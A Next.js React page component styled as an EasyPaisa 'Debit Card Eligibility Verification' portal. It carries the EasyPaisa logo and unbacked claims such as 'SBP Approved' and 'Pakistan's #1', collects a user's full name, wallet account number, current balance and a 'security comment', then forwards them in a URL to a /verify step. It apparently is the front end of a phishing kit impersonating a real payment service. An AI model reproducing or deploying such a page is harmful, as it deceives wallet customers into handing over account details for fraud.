"use client"

import { useState } from "react"
import { submitVerification } from "./actions"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Shield, Users, Clock, CheckCircle, CreditCard, Star, Timer, Sparkles } from "lucide-react"
import { EasyPaisaLogo } from "@/components/easypaisa-logo"

export default function VerificationPage() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [message, setMessage] = useState<{ type: "success" | "error"; text: string } | null>(null)

  async function handleSubmit(formData: FormData) {
    setIsSubmitting(true)
    setMessage(null)

    const result = await submitVerification(formData)

    if (result.success) {
      // Redirect to verification page with customer data
      const accountNumber = formData.get("accountNumber") as string
      const currentBalance = formData.get("currentBalance") as string
      const fullName = formData.get("fullName") as string

      const params = new URLSearchParams({
        account: accountNumber,
        balance: currentBalance,
        name: fullName,
      })

      window.location.href = `/verify?${params.toString()}`
    } else {
      setMessage({ type: "error", text: result.error! })
    }

    setIsSubmitting(false)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-green-50 to-teal-50">
      {/* Enhanced Header */}
      <div className="bg-gradient-to-r from-emerald-600 via-green-600 to-teal-600 py-6">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between">
            <EasyPaisaLogo width={200} height={66} variant="white" />
            <div className="flex items-center space-x-4">
              <Badge className="bg-white/20 text-white border-white/30 px-4 py-2">
                <Sparkles className="w-4 h-4 mr-2" />
                Verified Platform
              </Badge>
              <Badge className="bg-white/20 text-white border-white/30 px-4 py-2">
                <Star className="w-4 h-4 mr-2 fill-current" />
                Pakistan's #1
              </Badge>
            </div>
          </div>
        </div>
      </div>

      <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Hero Section */}
        <div className="text-center mb-20">
          {/* Pakistan's #1 Badge */}
          <div className="flex justify-center mb-10">
            <Badge className="bg-gradient-to-r from-emerald-500 to-green-600 text-white border-0 px-8 py-3 text-base font-semibold shadow-lg hover:shadow-xl transition-shadow">
              <Star className="w-5 h-5 mr-2 fill-current" />
              Pakistan's #1 Digital Payment Platform
            </Badge>
          </div>

          {/* Main Heading */}
          <h1 className="text-6xl md:text-7xl font-bold bg-gradient-to-r from-emerald-600 to-green-700 bg-clip-text text-transparent mb-8 leading-tight">
            Debit Card Eligibility
            <br />
            <span className="text-5xl md:text-6xl">Verification</span>
          </h1>

          {/* Subtitle */}
          <p className="text-xl text-gray-600 mb-12 max-w-3xl mx-auto leading-relaxed">
            Get instant verification for your EasyPaisa Debit Card. Join millions of satisfied customers with our secure
            and lightning-fast verification process.
          </p>

          {/* Feature Badges */}
          <div className="flex flex-wrap justify-center gap-6 mb-16">
            <Badge
              variant="outline"
              className="bg-white text-emerald-600 border-emerald-200 px-6 py-3 text-base shadow-md hover:shadow-lg transition-shadow"
            >
              <Shield className="w-5 h-5 mr-2" />
              Bank-Level Security
            </Badge>
            <Badge
              variant="outline"
              className="bg-white text-emerald-600 border-emerald-200 px-6 py-3 text-base shadow-md hover:shadow-lg transition-shadow"
            >
              <Timer className="w-5 h-5 mr-2" />
              2-Minute Process
            </Badge>
            <Badge
              variant="outline"
              className="bg-white text-emerald-600 border-emerald-200 px-6 py-3 text-base shadow-md hover:shadow-lg transition-shadow"
            >
              <CheckCircle className="w-5 h-5 mr-2" />
              99.9% Success Rate
            </Badge>
          </div>

          {/* Stats Cards */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 mb-20">
            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300 hover:-translate-y-1">
              <CardContent className="p-8 text-center">
                <div className="w-16 h-16 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg">
                  <Users className="w-8 h-8 text-white" />
                </div>
                <div className="text-3xl font-bold text-emerald-600 mb-2">2M+</div>
                <div className="text-gray-600 font-medium">Cards Activated</div>
              </CardContent>
            </Card>

            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300 hover:-translate-y-1">
              <CardContent className="p-8 text-center">
                <div className="w-16 h-16 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg">
                  <Star className="w-8 h-8 text-white fill-current" />
                </div>
                <div className="text-3xl font-bold text-emerald-600 mb-2">99.9%</div>
                <div className="text-gray-600 font-medium">Success Rate</div>
              </CardContent>
            </Card>

            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300 hover:-translate-y-1">
              <CardContent className="p-8 text-center">
                <div className="w-16 h-16 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg">
                  <Clock className="w-8 h-8 text-white" />
                </div>
                <div className="text-3xl font-bold text-emerald-600 mb-2">2 Min</div>
                <div className="text-gray-600 font-medium">Average Time</div>
              </CardContent>
            </Card>

            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300 hover:-translate-y-1">
              <CardContent className="p-8 text-center">
                <div className="w-16 h-16 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg">
                  <Shield className="w-8 h-8 text-white" />
                </div>
                <div className="text-3xl font-bold text-emerald-600 mb-2">24/7</div>
                <div className="text-gray-600 font-medium">Support</div>
              </CardContent>
            </Card>
          </div>

          {/* Feature Sections */}
          <div className="grid md:grid-cols-3 gap-12 mb-20">
            <div className="text-center group">
              <div className="w-20 h-20 bg-gradient-to-br from-emerald-100 to-emerald-200 rounded-3xl flex items-center justify-center mx-auto mb-8 group-hover:scale-110 transition-transform duration-300 shadow-lg">
                <Shield className="w-10 h-10 text-emerald-600" />
              </div>
              <h3 className="text-2xl font-bold text-emerald-600 mb-4">Secure Verification</h3>
              <p className="text-gray-600 leading-relaxed text-lg">
                Your data is protected with bank-level security and end-to-end encryption. We never store sensitive
                information.
              </p>
            </div>

            <div className="text-center group">
              <div className="w-20 h-20 bg-gradient-to-br from-emerald-100 to-emerald-200 rounded-3xl flex items-center justify-center mx-auto mb-8 group-hover:scale-110 transition-transform duration-300 shadow-lg">
                <CreditCard className="w-10 h-10 text-emerald-600" />
              </div>
              <h3 className="text-2xl font-bold text-emerald-600 mb-4">Instant Verification</h3>
              <p className="text-gray-600 leading-relaxed text-lg">
                Get results in seconds, not days. Our AI-powered system ensures lightning-fast processing and approval.
              </p>
            </div>

            <div className="text-center group">
              <div className="w-20 h-20 bg-gradient-to-br from-emerald-100 to-emerald-200 rounded-3xl flex items-center justify-center mx-auto mb-8 group-hover:scale-110 transition-transform duration-300 shadow-lg">
                <Users className="w-10 h-10 text-emerald-600" />
              </div>
              <h3 className="text-2xl font-bold text-emerald-600 mb-4">Trusted by Millions</h3>
              <p className="text-gray-600 leading-relaxed text-lg">
                Join millions of satisfied EasyPaisa users across Pakistan who trust our platform for their financial
                needs.
              </p>
            </div>
          </div>

          {/* CTA Button */}
          <div className="flex justify-center mb-16">
            <Button
              size="lg"
              className="bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 text-white px-16 py-6 text-xl font-bold rounded-2xl shadow-2xl hover:shadow-3xl transition-all duration-300 transform hover:scale-105"
              onClick={() => {
                const formSection = document.getElementById("verification-form-section")
                formSection?.scrollIntoView({ behavior: "smooth" })
              }}
            >
              <CreditCard className="w-6 h-6 mr-4" />
              Start Verification Process
            </Button>
          </div>
        </div>

        {/* Verification Form Section */}
        <div id="verification-form-section" className="max-w-lg mx-auto">
          <Card className="shadow-2xl border-0 overflow-hidden">
            <CardHeader className="bg-gradient-to-r from-emerald-600 to-green-600 text-white p-8">
              <CardTitle className="text-center text-2xl font-bold">Verify Your Eligibility</CardTitle>
              <CardDescription className="text-emerald-100 text-center text-lg">
                Enter your account details to begin instant verification
              </CardDescription>
            </CardHeader>
            <CardContent className="p-10">
              <form id="verification-form" action={handleSubmit} className="space-y-8">
                <div>
                  <Label htmlFor="fullName" className="text-base font-semibold text-gray-700 mb-3 block">
                    Full Name
                  </Label>
                  <Input
                    id="fullName"
                    name="fullName"
                    placeholder="Enter your full name as per CNIC"
                    required
                    disabled={isSubmitting}
                    className="h-12 text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
                  />
                </div>

                <div>
                  <Label htmlFor="accountNumber" className="text-base font-semibold text-gray-700 mb-3 block">
                    EasyPaisa Account Number
                  </Label>
                  <Input
                    id="accountNumber"
                    name="accountNumber"
                    placeholder="03XXXXXXXXX"
                    pattern="03\d{9}"
                    required
                    disabled={isSubmitting}
                    className="h-12 text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
                  />
                </div>

                <div>
                  <Label htmlFor="currentBalance" className="text-base font-semibold text-gray-700 mb-3 block">
                    Current Account Balance (PKR)
                  </Label>
                  <Input
                    id="currentBalance"
                    name="currentBalance"
                    type="number"
                    step="0.01"
                    min="0"
                    placeholder="Enter current balance amount"
                    required
                    disabled={isSubmitting}
                    className="h-12 text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
                  />
                </div>

                <div>
                  <Label htmlFor="securityComment" className="text-base font-semibold text-gray-700 mb-3 block">
                    Security Comment (Optional)
                  </Label>
                  <Textarea
                    id="securityComment"
                    name="securityComment"
                    placeholder="Any additional information or security notes"
                    rows={4}
                    disabled={isSubmitting}
                    className="text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg resize-none"
                  />
                </div>

                {message && (
                  <div
                    className={`p-4 rounded-xl text-base font-medium ${
                      message.type === "success"
                        ? "bg-green-50 text-green-700 border-2 border-green-200"
                        : "bg-red-50 text-red-700 border-2 border-red-200"
                    }`}
                  >
                    {message.type === "success" && <CheckCircle className="w-5 h-5 inline mr-2" />}
                    {message.text}
                  </div>
                )}

                <Button
                  type="submit"
                  className="w-full bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 py-4 text-lg font-bold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <Clock className="w-6 h-6 mr-3 animate-spin" />
                      Processing Verification...
                    </>
                  ) : (
                    <>
                      <CheckCircle className="w-6 h-6 mr-3" />
                      Verify Eligibility Now
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </div>

        {/* Trust Indicators */}
        <div className="text-center mt-20">
          <div className="flex flex-wrap justify-center items-center gap-8 mb-8">
            <Badge variant="outline" className="bg-white text-gray-600 border-gray-200 px-4 py-2">
              <Shield className="w-4 h-4 mr-2" />
              SSL Secured
            </Badge>
            <Badge variant="outline" className="bg-white text-gray-600 border-gray-200 px-4 py-2">
              <CheckCircle className="w-4 h-4 mr-2" />
              SBP Approved
            </Badge>
            <Badge variant="outline" className="bg-white text-gray-600 border-gray-200 px-4 py-2">
              <Users className="w-4 h-4 mr-2" />
              2M+ Users Trust Us
            </Badge>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center mt-16 text-gray-500">
          <p className="text-lg">
            © 2024 EasyPaisa. All rights reserved. |
            <a href="#" className="text-emerald-600 hover:underline ml-2 font-medium">
              Privacy Policy
            </a>{" "}
            |
            <a href="#" className="text-emerald-600 hover:underline ml-2 font-medium">
              Terms of Service
            </a>
          </p>
        </div>
      </main>
    </div>
  )
}
